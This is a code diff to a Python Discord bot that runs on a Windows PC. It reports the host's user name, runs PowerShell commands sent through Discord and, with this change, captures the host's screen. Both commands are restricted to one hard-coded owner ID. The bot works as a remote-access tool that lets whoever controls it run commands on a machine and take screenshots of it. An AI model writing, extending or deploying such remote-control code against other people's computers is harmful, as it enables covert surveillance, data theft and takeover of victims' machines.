@@ -1,3 +1,4 @@
+from types import NoneType
 import asyncio
 import getpass
 import socket
@@ -9,6 +10,7 @@ from discord import TextChannel
 from discord.ext import commands
 from discord.ext.commands import Context
 
+from src.cmd.screenshot import take_screenshot
 from src.cmd.shell import execute_cmd
 from src.constants import UPDATE_TAG, VERSION
 
@@ -19,10 +21,7 @@ intents.members = True
 channel = None
 pc_user_name = "Unknown"
 
-bot = commands.Bot(
-    command_prefix="z!",
-    intents=intents,
-)
+bot = commands.Bot(command_prefix="z!", intents=intents, owner_id=915623041105551420)
 
 
 @bot.event
@@ -100,7 +99,7 @@ async def on_message(message: discord.Message):
 async def ping(ctx: Context, *, args: str | None):
     latency = round(bot.latency * 1000)  # latency in milliseconds
 
-    if args and "-v" in args or "--verbose" in args:
+    if args and "-v" in args:
         await ctx.reply(
             f"Pong! 🏓 ({latency / 10}ms)\n**User:** {pc_user_name}\n**Version:** {VERSION}\n**Update Tag:** {UPDATE_TAG}"
         )
@@ -112,6 +111,8 @@ async def ping(ctx: Context, *, args: str | None):
 # === SHELL COMMAND ===
 # =========================
 @bot.command(name="shell", brief="Run powershell commands")
+@commands.is_owner()
+@commands.guild_only()
 async def shell(ctx: Context, *, user_cmd: str | None):
     if not user_cmd:
         await ctx.reply(
@@ -121,3 +122,16 @@ async def shell(ctx: Context, *, user_cmd: str | None):
 
     result = execute_cmd(user_cmd) or f'Executed "{user_cmd}" with no output'
     await ctx.reply(result)
+
+
+# ===========================
+# === SCREENSHOT COMMAND ===
+# ===========================
+@bot.command(
+    name="screenshot",
+    brief="Capture the bot host's screen",
+)
+@commands.is_owner()
+@commands.guild_only()
+async def screenshot(ctx):
+    await take_screenshot(ctx)
